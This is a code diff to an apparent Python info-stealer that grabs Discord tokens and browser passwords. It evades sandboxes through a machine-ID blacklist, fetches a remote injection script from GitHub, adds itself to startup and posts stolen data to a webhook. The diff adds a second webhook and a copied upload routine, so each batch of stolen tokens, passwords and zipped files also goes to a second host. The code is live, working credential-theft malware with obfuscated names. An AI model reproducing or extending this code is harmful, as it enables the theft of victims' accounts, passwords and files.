@@ -47,6 +47,7 @@ if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
     os._exit(0)
 
 wh00k = "WEBHOOK HERE"
+wh00k = ""
 inj_url = "https://raw.githubusercontent.com/PeppinUCocchet/SpammerCrealInj3ction/main/index.js"
     
 DETECTED = False
@@ -135,6 +136,18 @@ def L04durl1b(wh00k, data='', files='', headers=''):
                 return r
             else:
                 r = urlopen(Request(wh00k, data=data))
+                return r
+        except: 
+            pass
+            
+def L04durl1b2(wh00k2, data='', files='', headers=''):
+    for i in range(8):
+        try:
+            if headers != '':
+                r = urlopen(Request(wh00k2, data=data, headers=headers))
+                return r
+            else:
+                r = urlopen(Request(wh00k2, data=data))
                 return r
         except: 
             pass
@@ -346,6 +359,7 @@ if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower()
 
 def upl05dT4k31(t0k3n, path):
     global wh00k
+    global wh00k2
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
@@ -425,7 +439,7 @@ def upl05dT4k31(t0k3n, path):
         "attachments": []
         }
     L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
-
+    L04durl1b2(wh00k2, data=dumps(data).encode(), headers=headers)
 #hersey son defa :(
 def R4f0rm3t(listt):
     e = re.findall("(\w+[a-z])",listt)
@@ -463,6 +477,7 @@ def upload(name, link):
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
+        L04durl1b2(wh00k2, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "crpassw":
@@ -489,6 +504,7 @@ def upload(name, link):
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
+        L04durl1b2(wh00k2, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "kiwi":
@@ -517,6 +533,7 @@ def upload(name, link):
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
+        L04durl1b2(wh00k2, data=dumps(data).encode(), headers=headers)
         return
 
 
@@ -717,6 +734,7 @@ def GatherZips(paths1, paths2, paths3):
         "attachments": []
     }
     L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
+    L04durl1b2(wh00k2, data=dumps(data).encode(), headers=headers)
 
 
 def ZipTelegram(path, arg, procc):
